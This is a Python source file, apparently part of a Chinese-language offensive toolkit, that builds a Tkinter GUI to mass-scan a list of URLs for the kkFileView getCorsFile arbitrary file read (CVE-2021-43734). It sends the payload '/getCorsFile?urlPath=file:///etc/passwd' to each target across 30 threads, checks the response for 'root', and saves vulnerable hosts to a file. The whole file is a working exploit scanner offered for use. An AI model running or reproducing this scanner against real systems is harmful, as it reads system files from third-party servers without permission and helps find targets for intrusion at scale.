import requests
import json
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def kkFileView_readfile_CVE_2021_43734_exp(url):
    poc = r"""/getCorsFile?urlPath=file:///etc/passwd"""
    url = url + poc
    try:
        res = requests.get(url, verify=False, timeout=3)
        if "root" in res.text:
            kkFileView_readfile_CVE_2021_43734_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            kkFileView_readfile_CVE_2021_43734_text.see(END)
            with open("存在kkFileView getCorsFile 任意文件读取漏洞的url.txt","a+") as f:
                f.write(url + "\n")
        else:
            kkFileView_readfile_CVE_2021_43734_text.insert(END,"【×】不存在漏洞的url：" + url + "\n")
            kkFileView_readfile_CVE_2021_43734_text.see(END)
    except Exception as err:
        kkFileView_readfile_CVE_2021_43734_text.insert(END, "【×】目标请求失败，报错内容：" + str(err) + "\n")
        kkFileView_readfile_CVE_2021_43734_text.see(END)
def get_kkFileView_readfile_CVE_2021_43734_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def kkFileView_readfile_CVE_2021_43734_gui():
    kkFileView_readfile_CVE_2021_43734 = tk.Tk()
    kkFileView_readfile_CVE_2021_43734.geometry("910x450")
    kkFileView_readfile_CVE_2021_43734.title("kkFileView getCorsFile 任意文件读取漏洞一把梭")
    kkFileView_readfile_CVE_2021_43734.resizable(0, 0)
    kkFileView_readfile_CVE_2021_43734.iconbitmap('logo.ico')
    global kkFileView_readfile_CVE_2021_43734_text
    kkFileView_readfile_CVE_2021_43734_text = scrolledtext.ScrolledText(kkFileView_readfile_CVE_2021_43734,width=123, height=25)
    kkFileView_readfile_CVE_2021_43734_text.grid(row=0, column=0, padx=10, pady=10)
    kkFileView_readfile_CVE_2021_43734_text.see(END)
    addrs = get_kkFileView_readfile_CVE_2021_43734_addr()
    max_thread_num = 30
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(kkFileView_readfile_CVE_2021_43734_exp, addr)
    kkFileView_readfile_CVE_2021_43734.mainloop()